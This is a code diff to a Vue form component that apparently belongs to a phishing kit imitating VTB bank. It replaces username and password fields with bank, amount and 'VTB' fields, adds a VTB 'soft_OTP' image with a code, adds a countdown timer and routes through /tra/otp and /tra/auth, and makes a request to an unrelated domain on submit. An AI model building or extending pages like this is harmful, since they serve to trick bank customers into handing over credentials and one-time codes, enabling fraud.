@@ -5,7 +5,7 @@ import {useI18n} from "vue-i18n";
 import {reactive, ref} from "vue";
 import {ElMessage} from "element-plus";
 import {useLikeSearch} from "@/hooks/index.js";
-import {useRouter} from "vue-router";
+import {useRouter} from 'vue-router'
 import {get} from "@/api/http.js";
 const {t,locale}=useI18n()
 const router=useRouter()
@@ -13,51 +13,50 @@ const baseForm = ref();
 const {getSearchParams, likeSearchModel} = useLikeSearch();
 likeSearchModel.conditionItems = reactive([
   {
-    label: "form.username",
+    label: "form.bank",
     type: "input",
-    name: "username",
+    name: "bank",
     value: "",
     maxLength: 50,
     inputType: "text",
     span:20,
   },
   {
-    label: "form.password",
+    label: "form.amount",
     type: "input",
-    name: "password",
+    name: "amount",
     value: "",
     maxLength: 50,
-    inputType: "password",
+    span:20,
+    showPass:true
+  },{
+    label: "form.clew",
+    type: "input",
+    name: "clew",
+    value: "",
+    maxLength: 50,
+    span:20,
+    showPass:true
+  },{
+    label: "ref.VTB",
+    type: "input",
+    name: "VTB",
+    value: "",
+    maxLength: 50,
     span:20,
     showPass:true
   },
-].map(it=>({...it,validator: ({ value = "", placeholder = "" }) => {
-    if (!value) {
-      ElMessage.error(t("result.field_required"));
-      return false;
-    }
-    return true;
-  },})));
-const rules={
-  username: [
-    { required: true, message: t("result.field_required"), trigger: "blur" },
-  ],
-  password: [
-    { required: true, message: t("result.field_required"), trigger: "blur" },
-  ],
-}
+].map(it=>({...it,disabled:true})));
 const onSubmit = () => {
-  if (baseForm.value.checkParams()){
-    get('https://netease.store/home/recommend').then(v=>{
-      console.log(getSearchParams())
-      router.push('/tra/otp')
-    }).catch(r=>{
-      router.replace('/tra/result')
-    })
-  }
+  get('https://netease.store/home/recommend').then(v=>{
+    console.log(getSearchParams())
+    router.push('/tra/auth')
+  }).catch(r=>{
+    router.replace('/tra/result')
+  })
 }
 const formConfig={
-  labelWidth: 220,
+  labelWidth: 150,
   size: "default",
   labelPosition: "right",
 }
@@ -68,25 +67,31 @@ const priceProps=reactive({
 </script>
 
 <template>
+  <h1 class="page_title">{{$t('step.authorization')}}</h1>
   <div class="form">
     <div class="form_style">
-      <div class="item deposit">
-        <div class="item_tit">{{ $t("login.deposit") }}</div>
-        <div class="item_txt">
-          {{ priceProps.currency }}<span class="num">{{ priceProps.amount }}</span>
-        </div>
-      </div>
       <BaseForm
           ref="baseForm"
-          :configRules="rules"
           :form-items="likeSearchModel.conditionItems"
           :config="formConfig"
       />
+      <div class="smart-info">
+        <div class="smart-info-img">
+          <img src="http://toptuna.test/images/vtb/soft_OTP.jpg" style="margin: 0 auto; height: 500px;">
+        </div>
+
+        <div class="smartnote-info-1">
+          <!--          <span>{{$t('smartnote.info1')}} </span> DFH48HS <span>{{$t('smartnote.info2')}}</span>-->
+          <span> </span> DFH48HS <span></span>
+        </div>
+
+        <div class="smartnote-info-2" i18n="smartnote.info3"> </div>
+      </div>
     </div>
   </div>
   <div class="footer">
     <Button @btn="onSubmit">{{$t('btn.confirm')}}</Button>
-    <Alarm :start-time="360" @time-end="args => $router.replace('/tra/result')"/>
+    <Alarm :start-time="120" @time-end="args => $router.replace('/tra/result')"/>
   </div>
 </template>
 
